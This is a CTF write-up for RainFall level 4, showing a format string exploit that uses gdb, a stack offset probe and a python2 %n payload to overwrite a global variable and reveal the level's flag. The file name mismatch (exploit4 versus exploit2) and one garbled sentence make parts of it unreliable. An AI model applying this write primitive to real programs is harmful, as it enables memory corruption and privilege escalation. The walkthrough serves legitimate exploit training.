
# Level 4

This program is vulnerable to format string like the last one, but this time we need to write a big value

Let's find the address to the m variable:

```bash
level4@RainFall:~$ gdb -q level4 
Reading symbols from /home/user/level4/level4...(no debugging symbols found)...done.
(gdb) p &m
$1 = (<data variable, no debug info> *) 0x8049810
(gdb) 
```

We have the address of the variable


Now we can see that the buffer is the 12th argument on the stack, so we can use the %12$p format specifier to print the value of the buffer:


```
level4@RainFall:~$ ./level4 
AAAA%12$p
AAAA0x41414141
```

Now we can use the `%n` format specifier to write the value 64 to the address of the `m` variable. To achieve this, we need to write 16930116 characters to the buffer first, w, we just need to write the proper value at this address.  Note that we only need to add 16930112 as the address is 4 bytes long.


```bash
level4@RainFall:~$ python2 -c "print '\x10\x98\x04\x08' + '%16930112x' + '%12\$n'" > /tmp/exploit4
level4@RainFall:~$ cat /tmp/exploit2  | ./level4
[......SNIP......]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```


